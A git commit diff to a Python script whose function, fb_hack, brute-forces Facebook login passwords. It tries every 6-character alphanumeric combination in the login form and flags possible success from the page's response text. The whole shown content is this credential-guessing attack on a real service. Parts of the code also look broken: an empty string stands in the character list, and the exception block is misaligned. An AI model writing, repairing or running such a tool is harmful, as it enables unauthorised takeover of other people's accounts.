d65f2bf67c05d15f8faaffb9d6b77f82259de612
krarktel112 <krarktel@gmail.com>
2024-09-24 15:02:09 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -60,30 +60,26 @@ def fb_hack(email, codex):
   check2 = soup.find(string="Try another way")
   browser.select_form(nr=0)
   for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
-    if codex < counter:
+    x = (''.join(map(str, combination)))
+    try:
       x = (''.join(map(str, combination)))
-      codex += 1
-    else:
-      try:
-        while check1 != "None":
-          x = (''.join(map(str, combination)))
-          browser.form['pass'] = x
-          browser.submit()
-          test1 = (x, " Failed")
-          test2 = (x, " Succeded")
-          counter += 1
-          yo = h.join(test1)
-          yo2 = h.join(test2)
-          response1 = browser.response()
-          soup = BeautifulSoup(response1, 'html.parser')
-          check1 = soup.find(string="Try another way")
-          if check1 == check2:
-            print(test1)
-            sleepy(30)
-          else:
-            print("Possible success")
-            print(test2)
-            raise
+      browser.form['pass'] = x
+      browser.submit()
+      test1 = (x, " Failed")
+      test2 = (x, " Succeded")
+      counter += 1
+      yo = h.join(test1)
+      yo2 = h.join(test2)
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      check1 = soup.find(string="Try another way")
+      if check1 == check2:
+        print(yo)
+        sleepy(30)
+      else:
+        print("Possible success")
+        print(test2)
+        raise
       except:
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
